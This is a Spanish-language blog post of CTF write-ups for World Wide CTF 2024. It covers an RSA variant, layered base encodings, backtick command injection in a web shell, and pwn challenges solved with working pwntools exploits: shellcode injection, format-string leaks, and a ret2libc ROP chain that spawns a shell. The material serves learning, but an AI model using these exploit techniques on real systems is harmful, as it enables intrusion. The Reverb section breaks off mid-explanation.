---
title: World Wide CTF 2024 Challenges
time: 2024-12-07 5:00:00
categories: [CTF, WriteUps]
tags: [CTF, WriteUps]
image: /assets/posts/WorldWideCTF2024/1.png
---

Hola a todos!

Esto son algunos write ups del CTF organizado por `World Wide Flags` el cual fue un gran CTF y mi equipo `UciTeam1` disfrutamos.

## Begginers

### Simple_RSA
[Original](https://github.com/halexys/UciTeam1/blob/main/World_Wide_CTF_2024/Begginers/Simpler_RSA.md)

Esto es un cifrado similar a RSA, pero vulnerable, ya que en RSA el cifrado ocurre de la manera siguiente:


`c = m^e (mod n)`


Donde c es el mensaje cifrado, m es el mensaje en texto plano, e es un numero que cumple 1 < e < φ(n) y gcd(e, φ(n)) = 1. 

Pero en el reto el cifrado es este:


`c = flag^p (mod q)`


Para descifrar tenemos que encontrar el inverso modular de p mod q - 1, digase d, o sea debe cumplirse que: *p\*d = 1 mod (q - 1)* 
y luego *c^d mod q = flag*

Podemos demostrar que esto nos llevará a la flag :


`flag^p mod q`          


Elevamos *flag^p* al inverso multiplicativo de p, d, y aplicando propiedades de las potencias *flag^p^d = flag^(p\*d)*


`flag^(p*d) mod q`      


Podemos decir que p*d = 1 mod (q - 1) es equivalente a *p\*d=k\*(q-1)+1*, luego


`flag^(k*(q-1)+1) mod q`    


Nuevamente podemos aplicar propiedad de las potencias   


`flag^(q-1)^k * flag^1 mod q`    


Aqui por el teorema pequeño de Fermat: *F^(q-1) = 1 mod q*, podemos simplificar


`1^k * flag mod q`            


`flag mod q`                     


Y ya tendremos la flag!

Este es el script de python que realiza las operaciones

``` python
# solve.py
p = 20322136122026329892580404875086132520732558134579258531781672192065024437324055172065343417524169304918928056147680414370351055409439818026607876517460045945556933456319117456860928521423787112252544266864178773974904640732880445449138842965327995838722222110164109025916914430044528254715080648900354468118393295346137198518513075775514617222780524163798065365970392865107270392212968677531885628998155305428785133820145555740608026626724539584106018453003156159305252013173659975815845286802275956807162426425721298560633326719023970391963404981189820163950120529861779878077006530640930032570206978446007206971761
q = 19097560527100693557502945814016176943507375936656621847599300620729196257594977906326233653252987169303598004653720974045696589437233399711658994040877123702369987961301047714594623670674571987772814959679153558360152976652255742578324469478560556855210734037861198243000935281050776548747455717266013266531885744852759548255091579407464355390341944708706006878618904548103612995804547530724085856234186750409404880456083750984829553552127853848824218180459231650990529456828407224866655873224370892839628814748212142246752082561042142636866939231370987974125358875253454199574864895153300338298982667319003886687691
c = 4281681357519343869235268029657832985104802601857889851833662824770073601279722389949102805423012693423900316266993146428480448851806951090530135683459342224839031144425810971344588481297094697047852347659595441639804230546879345999083627138617034295731725402645279785129174304818023129638779656619113578465655082808462489379872294929944719545647280271454196700396004152529288987570497804498041888697213294509916951489315431831556860863264254674452235360890586742441263188663158067860877772336480637257856658858967478284817730555629113613134338975168062044831796369552664256963808360408525644200922627703094455580032

d = pow(p,-1,q-1)                                                   # inverso modular multiplicativo de p mod (q-1) 

flag = pow(c,d,q)                                                   # c^d mod q

flag_ascii = bytes.fromhex(hex(flag)[2:]).decode('utf-8')
print(flag_ascii)
```               

``` 
 python3 solve.py 
wwf{ju57_u53_l1br4r135}
```

`wwf{ju57_u53_l1br4r135}`



### White Rabbit

[Original](https://github.com/halexys/UciTeam1/blob/main/World_Wide_CTF_2024/Begginers/WhiteRabbit.md)

Un reto de pwn en un binario de 64 bits, analizamos las propiedades del ejecutable

``` bash
checksec --file=white_rabbit 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   31 Symbols	  No	0		2	white_rabbit
```

+ No canary found: Es vulnerable a buffer overflow

+ NX disabled: El codigo de la pila es ejecutable

Observamos el binario
``` bash
./white_rabbit 

  (\_/)
  ( •_•)
  / > 0x5609dc927180

follow the white rabbit...
```

Nos filtran una direccion de memoria y podemos introducir datos. Desensamblamos el programa con Radare2 y observamos mejor este comportamiento al desensamblar sym.main y sym.follow respectivamente

``` asm
|           0x000011fc      488d057dff..   lea rax, [sub.dbg.main_1180] ; warmup.c:20 ; 0x1180
|           0x00001203      4889c6         mov rsi, rax
|           0x00001206      488d050d0e..   lea rax, str._______p_n_n   ; 0x201a ; "  / > %p\n\n"
|           0x0000120d      4889c7         mov rdi, rax                ; const char *format
|           0x00001210      b800000000     mov eax, 0  
|           0x00001215      e826feffff     call sym.imp.printf         ; int printf(const char *format)
```

``` asm
            ;-- follow:
            ; CALL XREF from sub.dbg.main_1180 @ 0x122e(x)
/ 23: sub.dbg.follow_1169 ();
| afv: vars(1:sp[0x78..0x78])
|           0x00001169      55             push rbp                    ; warmup.c:8 ; void follow();
|           0x0000116a      4889e5         mov rbp, rsp
|           0x0000116d      4883ec70       sub rsp, 0x70
|           0x00001171      488d4590       lea rax, [buf]              ; warmup.c:10
|           0x00001175      4889c7         mov rdi, rax                ; char *s
|           0x00001178      e8d3feffff     call sym.imp.gets           ; char *gets(char *s)
|           0x0000117d      90             nop                         ; warmup.c:11
|           0x0000117e      c9             leave
\           0x0000117f      c3             ret
```

Podemos ver que la dirección que se filtra es la de la función main, luego en sym.follow se encuentra la entrada de usuario capturada con gets (una función vulnerable). 

Podemos darnos cuenta de que se reservan 120 bytes antes de la direccion de retorno de main:

``` asm
    push rbp  -> reserva 8 bytes porque estamos en una arquitectura x86_64 y por lo tanto este registro es de 64 bits
    sub rsp, 0x70   ->  reserva 0x70(112 en decimal) bytes
```
Ya tenemos control de RIP. Ahora tenemos que introducir un shellcode en la pila y encontrar una forma de apuntar a esta dirección.

``` asm
   lea rax, [buf]   -> rax almacena la direccion base del buffer en la pila
```

Buscamos un gadget del tipo `jmp rax`. En radare podemos hacer esto con `/R jmp rax`

``` asm 
/R jmp rax
  0x000010b1               7415  je 0x10c8
  0x000010b3     488b050e2f0000  mov rax, qword [rip + 0x2f0e]
  0x000010ba             4885c0  test rax, rax
  0x000010bd               7409  je 0x10c8
  0x000010bf               ffe0  jmp rax
``` 

Buscamos su desplazamiento con respecto a la direccion de main. Podemos ver la direccion de main listando las funciones con `afl` 

``` bash
python3
Python 3.12.7 (main, Oct  3 2024, 15:15:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x00001180-0x000010bf)
'0xc1'
```

Ya tenemos todo lo necesario

```python
# rabbit.py
from pwn import *
import re

io = process('./white_rabbit')
elf = context.binary = ELF('./white_rabbit')

leak = io.recv()
main = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)
shellcode = asm(shellcraft.sh())                           
jmp_rax = main - 0xc1

payload = shellcode
payload += cyclic(120-len(shellcode))
payload += p64(jmp_rax)

io.sendline(payload)
io.interactive()
io.close()
```


### Secure Shell

[Original](https://github.com/halexys/UciTeam1/blob/main/World_Wide_CTF_2024/Begginers/SecureShell.md)

Nos daban una pagina web en la cual podiamos escribir comandos, la mayoria los denegaba lo que nos daba a pensar que usaba
una whitelist en lugar de una blacklist de comandos. El comando `ls` y `echo` eran de los comandos permitidos, con `ls`
podíamos ver que en el directorio actual había un index.php, y `ls /` veíamos que habían varios archivos entre ellos un `readflag`.
Comencé el RCE usando \` command \` con echo: "echo \`cat index.php\`", el index dentro de los comentarios mencionaba los comandos permitidos,
`echo`,`ls`... Luego con "echo \`file /readflag\`" veíamos que era un binario y con "echo \`/readflag\`" leíamos la flag.


### All your base are belong to us

Tenemos el siguiente texto codificado:

MkpIbmdFcWs4MzVjR3BHRXFVVnZtZWJUQWtSTlNNamE1dGZYQTdwR25ac203SnJQV2FyTUdHQnA3Uk1XZDNZVFlTNTJjemVya1BCN0dBY2NBNkN4U1VBS29TalVBOU1tR1EyYUF0UVlHZTFYOXp1TThWS2o1OHdKRFJaVXhzTGRaZUpaTGV6NUFWc2JHdm5CbTdjV28yNTRyWGpzQURYdEhkSmJmWmtGREVEQWZWeEhFeDNYanNNODZMZVo2cnM2NExGbU5QeG1mUXBqQ3BoY3pCczlRa3kySnFZb1JzSnFtUnk0cW02WFgyOU50N1g2Vg==

Usando [cyberchef](https://cyberchef.io/) y su operación Magic, con la secuencida de operaciones FromBase64 -> FromBase58 -> FromBase32 -> FromBase85 podemos sacar unos caracteres que parecen chinos

𔕷𠅦𖥣桢顲桨鑦敤𓅥𓉮鵟𔐴鐳ꌴ鑬鵴鐳𐘴𔕳𓀳鑳𔔴敧栴鬲ᕽ

En la descripción del reto se alude a base 2^16 o base 65536, usando este [decodificador](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode) extraemos la flag

`wwf{cyb3rch3f_d0esnt_h4v3_4ll_th3_4nsw3rs_4wg0432f}`

## Pwn

### Buffer Brawl

[Original](https://github.com/halexys/UciTeam1/blob/main/World_Wide_CTF_2024/PWN/Buffer_brawl.md)

Nos dan un juego en donde nos enfrentamos al stack y tenemos varias opciones:
```
Ladies and gentlemen...
Are you ready? For the main event of the CTF?
Introducing...
A challenge that packs a punch, tests your mettle, and overflows with excitement!
Let's get ready to buffeeeeeeeer!!!


Choose:
1. Throw a jab
2. Throw a hook
3. Throw an uppercut
4. Slip
5. Call off
```

Revisamos la seguridad del binario con checksec:
``` bash
checksec --file=buffer_brawl 
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

No tiene nada relevante, pero sí encontramos una [vulnerabilidad de cadena formateada](https://owasp.org/www-community/attacks/Format_string_attack) en la funcion slip:
``` 
Ladies and gentlemen...
Are you ready? For the main event of the CTF?
Introducing...
A challenge that packs a punch, tests your mettle, and overflows with excitement!
Let's get ready to buffeeeeeeeer!!!


Choose:
1. Throw a jab
2. Throw a hook
3. Throw an uppercut
4. Slip
5. Call off
> 4

Try to slip...
Right or left?
%p
0x7ffca7cad6f0
```

El parámetro %p en una cadena de formato se utiliza para imprimir una dirección de memoria en formato hexadecimal, con varias podemos imprimir las direcciones de memoria en la pila.

Con este script filtramos las primeras 12 direcciones de memoria del stack y formateamos un poco la salida:

``` python
#leakstack.py
from pwn import *

elf = context.binary = ELF('./buffer_brawl')

io = process('./buffer_brawl')
io.sendline(b"4")
io.recvuntil(b"Right or left?\n")
io.sendline(b"%p"*14)
stack = io.recvline(keepends=False)
stack = [ 
         int(s,16) for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
         ]
print(stack)

for i, s in enumerate(stack):
    # i+1 because $ offsets start at 1
    print(f"{i+1}: {p64(s)} {hex(s)}") 
```

```
python3 leakstack.py 
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Starting local process './buffer_brawl': pid 6996
[140732999497680, 29, 140658260300893, 0, 0, 8080988412483825701, 8080988412483825701, 8080988412483825701, 94602831163429, 94888781943153, 7242369383397573120, 94888781944032, 94888781940551, 36]
1: b'\xd0wq\xf4\xfe\x7f\x00\x00' 0x7ffef47177d0
2: b'\x1d\x00\x00\x00\x00\x00\x00\x00' 0x1d
3: b']\xd4\xa3\x8d\xed\x7f\x00\x00' 0x7fed8da3d45d
4: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
5: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
6: b'%p%p%p%p' 0x7025702570257025
7: b'%p%p%p%p' 0x7025702570257025
8: b'%p%p%p%p' 0x7025702570257025
9: b'%p%p\nV\x00\x00' 0x560a70257025
10: b'q\x11$\x04MV\x00\x00' 0x564d04241171
11: b'\x00\xc2\x93\x1d\x95\x10\x82d' 0x648210951d93c200
12: b'\xe0\x14$\x04MV\x00\x00' 0x564d042414e0
13: b'G\x07$\x04MV\x00\x00' 0x564d04240747
14: b'$\x00\x00\x00\x00\x00\x00\x00' 0x24
[*] Stopped process './buffer_brawl' (pid 6996)
```

Escribimos el stack en 6, 11 es el canario y 13 es la direccion de retorno al menú. Podemos comprobar esto en radare2 u otro debbugger:

![f1](https://github.com/user-attachments/assets/21c62cc0-ed0b-4073-8b97-935f0c10b5c0)

![return](https://github.com/user-attachments/assets/ef5625c9-3247-4e99-95db-0c8c4d64da63)

La primera imagen es el estado de la pila justo después de introducir la cadena, y la segunda es justo antes de ret. Como podemos observar efectivamente la décimo-tercera dirección filtrada es el retorno.

Para calcular la direccion base del ejecutable solo hay que restarle el desplazamiento de esa direccion a la direccion filtrada. Encontramos el desplazamiento en un análisis estático al elf.

![slipreturn](https://github.com/user-attachments/assets/385fe987-62a0-4462-8ffd-8362b0318bfa)

%<n>$p es un identificador de formato que nos permite imprimir un valor específico de la pila, donde n es el desplazamiento a a dirección actual del puntero de pila, contado a partir de 1.

Entonces, podemos obtener las direcciones que nos interesan con %11$p y %13$p y calcular la direccion base del ejecutable, por ahora el script iría quedando así:

``` python
from pwn import *
exe = context.binary = ELF("buffer_brawl")
io = process(exe.path)

def stack_leak(p):
    io.sendline(b"4")
    io.recvuntil(b"Right or left?\n")
    io.sendline(p)
    return io.recvline(keepends=False)

cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
cookie = int(cookie[2:], 16)                              # Canario
exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base
``` 

Aquí ahora necesitamos hacer un ret2libc, para eso necesitamos la dirección base de libc, pero primero tenemos que filtrar alguna dirección de las funciones de libc usadas en el ejecutable (printf, puts, etc...)

Nos auxiliaremos del parámetro %s, que muestra la memoria de una dirección dada en el stack (los símbolos de la Global Offset Table en tiempo de ejecución contienen la dirección real de la función en libc). El relleno con ljust se usa para alinear correctamente la memoria y asegurarse de que la dirección de la GOT esté en la posición adecuada:

``` python
# 2.Obtener la direccion base de libc
def leak_got(sym):
    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
    addr = u64(addr[:6] + b"\x00\x00")
    return addr

puts_addr = leak_got("puts")
io.info(f"{leak("puts")=:x}")

""""
# Usado para encontrar la version de libc correcta en el remoto
io.info(f"{leak_got("printf")=:x}")
io.info(f"{leak_got("read")=:x}")
io.info(f"{leak_got("exit")=:x}")
""" 

libc.address = puts_addr - libc.sym.puts
```

Bien, ahora necesitamos un buffer overflow para ganar una shell remota. Si dejamos la vida del stack en el juego a 13 exactamente nos lleva a una función stack_smash que acepta una entrada:

``` C
void stack_smash(void)

{
  long in_FS_OFFSET;
  undefined auStack_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nThe stack got dizzy! Now it\'s your time to win!");
  puts("Enter your move: ");
  __isoc99_scanf(&DAT_0010213d,auStack_28);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}
```

Haremos un ROP, para llamar a system('/bin/sh'), podemos encontrar los gadgets con ROPGadget:

```
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6| grep "pop rax ; ret"

0x00000000000436a4 : add byte ptr [rax - 0x75], cl ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00000000000436a7 : add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x0000000000043047 : pop rax ; ret
0x00000000001027d1 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
0x00000000000cd4f2 : sub al, 0x3b ; sub al, 0x75 ; pop rax ; ret
0x00000000000cd4f5 : sub al, 0x75 ; pop rax ; ret

 ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6| grep "pop rdi ; jmp rax"
0x000000000002d114 : pop rdi ; jmp rax
```

Script final:
``` python
from pwn import *
exe = context.binary = ELF("buffer_brawl")
libc = context.binary = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
# io = connect("buffer-brawl.chal.wwctf.com", 1337)
# io = connect("localhost",4444)
io = process(exe.path)

# 1.Obtener la direccion base del binario
def stack_leak(p):
    print(f"INPUT={p}")
    io.sendline(b"4")
    io.recvuntil(b"Right or left?\n")
    io.sendline(p)
    return io.recvline(keepends=False)

cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
cookie = int(cookie[2:], 16)                              # Canario
exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base


# 2.Obtener la direccion base de libc
def leak_got(sym):
    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
    addr = u64(addr[:6] + b"\x00\x00")
    return addr

puts_addr = leak_got("puts")
io.info(f"{leak_got("puts")=:x}")
""""
# Usado para encontrar la version de libc correcta en el remoto
io.info(f"{leak_got("printf")=:x}")
io.info(f"{leak_got("read")=:x}")
io.info(f"{leak_got("exit")=:x}")
""" 

libc.address = puts_addr - libc.sym.puts

# 3.Lanzar golpes al stack hasta dejarlo en 13
for i in range(29):
    io.sendlineafter(b"\n> ", b"3")


# 4.ROP
payload = cyclic(24)
payload += p64(cookie)
payload += cyclic(8)
payload += p64(libc.address+0x0000000000043047)  # pop rax; ret
payload += p64(libc.sym.system)                  
payload += p64(libc.address+0x000000000002d114)  # pop rdi; jmp rax

payload += p64(next(libc.search(b"/bin/sh")))    # rdi

""" 
# Otra forma mas sencilla usando el objeto rop
rop = ROP([exe, libc])
rop.raw(rop.ret.address)                             # Alinear el stack
rop.call("system", [next(libc.search(b"/bin/sh"))])

payload = flat(
    cyclic(24),
    p64(cookie),
    cyclic(8),
    rop.chain(),
)
"""


io.sendline(payload)
io.success("PWNED")
io.interactive()
```

``` 
python3 exploit.py
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
[+] Starting local process '/home/kalcast/Descargas/buffer_brawl': pid 17873
[*] leak_got("puts")=7fb48d5c8580
[+] PWNED
[*] Switching to interactive mode

You threw an uppercut! -3 to the stack's life points.

The stack got dizzy! Now it's your time to win!
Enter your move: 
$ whoami
kalcast
$  
```

### Reverb

Parcheamos el ELF para asegurarnos que usa el mismo enlazador dinamico y libc que el remoto:
```
patchelf --set-interpreter ld-linux-x86-64.so.2 --set-rpath $(pwd) chall
chmod u+x libc.so.6 ld-linux-x86-64.so.2 chall
./chall 
>> Soy el senor Meeseeks
Soy el senor Meeseeks
```

Vemos las propiedades del ejecutable:
```
checksec --file=chall
[*] '/home/kalcast/Descargas/reverb/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Vemos el código fuente y antes de imprimir la cadena se verifica con la función check que si hay caracteres '%' en la cadena: 
+ Debe tener al menos dos dígitos después
+ Los dígitos no deben comenzar con '0'
+ La conversión de esa cadena de dígitos a un entero largo debe ser menor o igual a 58

El parámetro %p en una cadena de formato se utiliza para imprimir una dirección de memoria en formato hexadecimal, con varias podemos imprimir las direcciones de memoria en la pila. Usar %10p es lo mismo que %p solo que imprimirá con un padding de 10 caracteres.

Con esto hacemos un script para filtrar la pila:

``` python
from pwn import *

elf = context.binary = ELF('./chall')
io = process(elf.path)

# el buffer es de 384 caracteres asi que podemos leer 384/4=96 direcciones de memoria de la pila
io.sendlineafter(b">> ",b"%10p"*90)  

stack = io.recvline(False)

# Convertir las filtraciones a un array de direcciones de memoria empaquetadas
stack = [
       p64(int(s,16))
       for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
]

# formatear la salida para observar mejor
for i,s in enumerate(stack):
    print(f"{i}: {s} {hex(u64(s))}")

```

```
0: b'\n\x00\x00\x00\x00\x00\x00\x00' 0xa
1: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
2: b'R\x0b\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00b52
3: b'\x99\x99\x99\x99\x99\x99\x99\x19' 0x1999999999999999
4: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
5: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
6: b'\xc8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fc8
7: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
8: b'\x00\x00@\x00\x01\x00\x00\x00' 0x100400000
9: b'%10p%10p' 0x7030312570303125
10: b'%10p%10p' 0x7030312570303125
11: b'%10p%10p' 0x7030312570303125
12: b'%10p%10p' 0x7030312570303125
13: b'%10p%10p' 0x7030312570303125
14: b'%10p%10p' 0x7030312570303125
15: b'%10p%10p' 0x7030312570303125
16: b'%10p%10p' 0x7030312570303125
17: b'%10p%10p' 0x7030312570303125
18: b'%10p%10p' 0x7030312570303125
19: b'%10p%10p' 0x7030312570303125
20: b'%10p%10p' 0x7030312570303125
21: b'%10p%10p' 0x7030312570303125
22: b'%10p%10p' 0x7030312570303125
23: b'%10p%10p' 0x7030312570303125
24: b'%10p%10p' 0x7030312570303125
25: b'%10p%10p' 0x7030312570303125
26: b'%10p%10p' 0x7030312570303125
27: b'%10p%10p' 0x7030312570303125
28: b'%10p%10p' 0x7030312570303125
29: b'%10p%10p' 0x7030312570303125
30: b'%10p%10p' 0x7030312570303125
31: b'%10p%10p' 0x7030312570303125
32: b'%10p%10p' 0x7030312570303125
33: b'%10p%10p' 0x7030312570303125
34: b'%10p%10p' 0x7030312570303125
35: b'%10p%10p' 0x7030312570303125
36: b'%10p%10p' 0x7030312570303125
37: b'%10p%10p' 0x7030312570303125
38: b'%10p%10p' 0x7030312570303125
39: b'%10p%10p' 0x7030312570303125
40: b'%10p%10p' 0x7030312570303125
41: b'%10p%10p' 0x7030312570303125
42: b'%10p%10p' 0x7030312570303125
43: b'%10p%10p' 0x7030312570303125
44: b'%10p%10p' 0x7030312570303125
45: b'%10p%10p' 0x7030312570303125
46: b'%10p%10p' 0x7030312570303125
47: b'%10p%10p' 0x7030312570303125
48: b'%10p%10p' 0x7030312570303125
49: b'%10p%10p' 0x7030312570303125
50: b'%10p%10p' 0x7030312570303125
51: b'%10p%10p' 0x7030312570303125
52: b'%10p%10p' 0x7030312570303125
53: b'%10p%10p' 0x7030312570303125
54: b'\n\x00\x00\x00\x00\x00\x00\x00' 0xa
55: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
56: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
57: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
58: b'\x00\x07\xc4\xa2\xa7\x81\xf9\xcc' 0xccf981a7a2c40700
59: b'\x01\x00\x00\x00\x00\x00\x00\x00' 0x1
60: b'\x90\x9d"gW\x7f\x00\x00' 0x7f5767229d90
61: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
62: b'z\x13@\x00\x00\x00\x00\x00' 0x40137a
63: b'\x00\x00\x00\x00\x01\x00\x00\x00' 0x100000000
64: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
65: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
66: b'\xa6(6\xad)O5\xc9' 0xc9354f29ad3628a6
67: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
68: b'z\x13@\x00\x00\x00\x00\x00' 0x40137a
69: b'\x18>@\x00\x00\x00\x00\x00' 0x403e18
70: b'@ ]gW\x7f\x00\x00' 0x7f57675d2040
71: b'\xa6(T\xb0I\xa4\xc86' 0x36c8a449b05428a6
72: b'\xa6(\xbc\x97l\x81\x9b7' 0x379b816c97bc28a6
73: b'\x00\x00\x00\x00W\x7f\x00\x00' 0x7f5700000000
74: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
75: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
76: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
77: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
78: b'\x00\x07\xc4\xa2\xa7\x81\xf9\xcc' 0xccf981a7a2c40700
79: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
80: b'@\x9e"gW\x7f\x00\x00' 0x7f5767229e40
81: b'\xc8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fc8
82: b'\x18>@\x00\x00\x00\x00\x00' 0x403e18
83: b'\xe02]gW\x7f\x00\x00' 0x7f57675d32e0
84: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
85: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
86: b'\xd0\x10@\x00\x00\x00\x00\x00' 0x4010d0
87: b'\xb0\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb0
88: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
89: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
```

En la offset 60 hay una dirección filtrada de libc. Si vemos el mapa de la memoria y buscamos la dirección base de libc en la GOT y calculamos el desplazamiento tendremos la dirección base en ejecución del programa:

```
[0x0040146c]> pxQ @ rsp + 0x168
0x7ffc8981fe08 0x7030312570303125 
0x7ffc8981fe10 0x7030312570303125 
0x7ffc8981fe18 0x7030312570303125 
0x7ffc8981fe20 0x7030312570303125 
0x7ffc8981fe28 0x000000000000000a section.+10
0x7ffc8981fe30 0x0000000000000000 section.
0x7ffc8981fe38 0x0000000000000000 section.
0x7ffc8981fe40 0x000000000000000a section.+10
0x7ffc8981fe48 0x96d00259e857ad00 
0x7ffc8981fe50 0x0000000000000001 section.+1
0x7ffc8981fe58 0x00007fde7aa29d90                 <--- offset 60
```

```
dm
0x00000000003fe000 - 0x00000000003ff000 - usr     4K s rw- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; segment.ehdr
0x0000000000400000 - 0x0000000000401000 - usr     4K s r-- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall
0x0000000000401000 - 0x0000000000402000 * usr     4K s r-x /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; map._home_kalcast_Descargas_reverb_chall.r_x
0x0000000000402000 - 0x0000000000403000 - usr     4K s r-- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; map._home_kalcast_Descargas_reverb_chall.r__
0x0000000000403000 - 0x0000000000404000 - usr     4K s r-- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; map._home_kalcast_Descargas_reverb_chall.rw_
0x0000000000404000 - 0x0000000000405000 - usr     4K s rw- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; obj._GLOBAL_OFFSET_TABLE_
0x00007fde7aa00000 - 0x00007fde7aa28000 - usr   160K s r-- /home/kalcast/Descargas/reverb/libc.so.6 /home/kalcast/Descargas/reverb/libc.so.6           <---- libc base de la depuracion actual
```

``` 
[0x0040146c]> ? 0x00007fde7aa29d90   - 0x00007fde7aa00000
int32   171408
uint32  171408
hex     0x29d90              <---- offset de la direccion filtrada con respecto a libc base
octal   0516620
unit    167.4K
segment 2000:9d90
string  "\x90\x9d\x02"
fvalue  171408.0
float   0.000000000000000f
double  0.000000000000000
binary  0b000000101001110110010000
base36  0_3o9c
ternary 0t22201010110 
```

En el offset 7 se filtra un puntero al mismo stack. Podemos obtener el valor de la direccion que filtra a libc (el retorno) para posteriormente sobreescribirlo con nuestra carga util. Le restamos rbp por el ajuste que se hace antes de retornar de una funcion en la pila, y luego restamos 8 por el tamaño reservado para variables al llamar a una función en el x86_64.

```
[0x0040146c]> pxQ @ rsp - 0x40
0x7ffc8981fc60 0x00007fde7ae39040 r15 
0x7ffc8981fc68 0x00007fde7aa7f410  
0x7ffc8981fc70 0x0000000000000000 section.                <---- offset 0 
0x7ffc8981fc78 0x00007ffc8981fe50 rbp
0x7ffc8981fc80 0x00007ffc8981ff68 r12
0x7ffc8981fc88 0x000000000040137a main
0x7ffc8981fc90 0x0000000000403e18 section..fini_array
0x7ffc8981fc98 0x0000000000401462 main+232
0x7ffc8981fca0 0x0000000000000000 section.     
0x7ffc8981fca8 0x00007ffc8981ff78 r12+16                  <---- offset 6
0x7ffc8981fcb0 0x00007ffc8981ff68 r12      
```

```
[0x0040146c]> ? 0x00007ffc8981ff78 - rbp - 8
int32   288
uint32  288
hex     0x120     <---- 
octal   0440
unit    288
segment 0000:0120
string  " \x01"
fvalue  288.0
float   0.000000000000000f
double  0.000000000000000
binary  0b0000000100100000
base36  0_80
ternary 0t101200
```

``` python
libc_base = u64(stack[60]) - 0x29D90
libc.address = libc_base
ret_addr = u64(stack[6]) - 0x120
```

La cadena %n nos permite escribir valores en la dirección de memoria que representa un valor en la pila, esta imprimirá el tamaño de nuestra entrada a esa dirección de memoria. Por ejemplo "AAAA%n" imprimirá el valor 4 en la dirección especificada por el valor en el offset 0. Otras variantes son %hn que escribe dos bytes y %hhn que escribe un byte; usaremos este ultimo ya que tenemos entradas infinitas.

Podemos usar esto sabiendo que en el offset 9 comienza nuestra entrada, pero por las restricciones necesitamos pasar un número, de 10 a 57 después de cada caracter '%'

La cadena %x muestra los 4 bytes mas significativos (recuerdese que esto es little-endian) del valor al que apunta la pila. Por ejemplo, si en el offset 6 se encuentra el valor '0x12345678' un %6$x imprimirá '5678'.

